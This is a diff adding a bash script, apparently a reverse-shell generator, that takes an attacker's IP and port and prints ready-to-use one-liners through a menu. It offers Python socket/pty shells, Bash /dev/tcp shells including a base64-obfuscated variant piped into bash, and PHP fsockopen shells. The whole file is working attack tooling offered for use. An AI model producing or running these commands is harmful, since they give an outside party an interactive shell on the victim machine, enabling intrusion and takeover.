@@ -1,0 +1,90 @@
+#!/bin/bash
+
+python_shell(){
+
+	echo -ne "\n"
+
+	cmd1="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${1}\",${2}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+	echo -ne "Command1 ==> $cmd1"
+	echo -ne "\n\n"
+
+	cmd2="python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${1}\",${2}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+	echo -ne "Command2 ==> $cmd2"
+	echo -ne "\n\n"
+
+}
+
+bash_shell(){
+
+	echo -ne "\n"
+
+	cmd1="/bin/bash -i >& /dev/tcp/${1}/${2} 0>&1"
+	echo -ne "Command1 ==> $cmd1"
+	echo -ne "\n\n"
+
+	cmd2="bash -c 'bash -i >& /dev/tcp/${1}/${2} 0>&1'"
+	echo -ne "Command2 ==> $cmd2"
+	echo -ne "\n\n"
+
+	b64_payload="bash -c 'bash -i >& /dev/tcp/${1}/${2} 0>&1'"
+	b64_output=$(echo "${b64_payload}" | base64 -w0)
+
+	cmd3="echo '${b64_output}' | base64 -d | bash 2>/dev/null"
+	echo -ne "Command3 ==> $cmd3"
+	echo -ne "\n\n"
+
+}
+
+php_shell(){
+
+	echo -ne "\n"
+
+	cmd1="php -r '$sock=fsockopen("${1}",${2});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	echo -ne "Command1 ==> $cmd1"
+	echo -ne "\n\n"
+
+	cmd2="php -r '$sock=fsockopen("${1}",${2});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	echo -ne "Command2 ==> $cmd2"
+	echo -ne "\n\n"
+
+}
+
+
+add_shell(){
+
+	PS3='Please enter your choice: '	# A prompt for the select command
+	shells=("Python" "Bash" "PHP" "Quit")
+	select opt in "${shells[@]}"
+	do
+	    case $opt in
+	        "Python")
+	            python_shell "${1}" "${2}"
+	            ;;
+	        "Bash")
+				bash_shell "${1}" "${2}"
+	            ;;
+	        "PHP")
+				php_shell "${1}" "${2}"
+	            ;;
+	        "Quit")
+				echo "BYE BYE"
+	            break
+	            ;;
+	        *) 
+				echo -ne "\nYou chose $REPLY\nPlease choose a valid option\n\n"
+				;;
+	    esac
+	done
+}
+
+
+if [[ $# -ne 2 ]]; then
+	echo "Wrong usage of the command"
+	echo "Usage : ./generate.sh IP PORT"
+
+else
+	ip=${1,,}		# Changing from uppercase to lowercase
+	port=${2,,}		# Changing from uppercase to lowercase
+	add_shell "${ip}" "${port}"		# Calling add_shell function with ip,port as args
+
+fi
